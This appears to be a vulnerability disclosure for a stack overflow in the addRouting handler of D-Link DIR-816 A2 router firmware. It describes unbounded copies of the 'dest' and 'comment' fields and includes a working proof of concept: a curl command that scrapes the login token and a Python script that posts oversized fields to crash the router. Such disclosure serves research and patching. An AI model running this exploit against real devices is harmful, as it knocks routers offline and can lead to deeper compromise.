# D-link DIR-816 A2_v1.10CNB04.img Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/addRouting/img/vuln1.png)

As can be seen from the above figure, when the hostnet is net, dest will be copied to v14. It is worth noting that the size is not limited, which leads to stack overflow.

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/addRouting/img/vuln2.png)

At the same time, there is another place below this function that can cause stack overflow. As shown in the figure above, the control v18 is the comment, and v18 will be added to v16. There is no size limit, which will lead to stack overflow.

## Poc

We need to get the tokenid first

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

接着构造以下poc即可

```python
import requests

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = 'xxx'

url = 'http://192.168.0.1/goform/addRouting'

data = {
    'tokenid' : tokenid,
    'dest' : 'a' * 10000, 
    'hostnet' : 'net',
    'netmask' : '255.255.255.0',
    'gateway' : '192.168.0.1',
    'interface' : 'LAN',
    'custom_interface' : 'br0',
    'comment' : 'a' * 10000

}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
```

final router crash


![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/addRouting/img/vuln3.png)
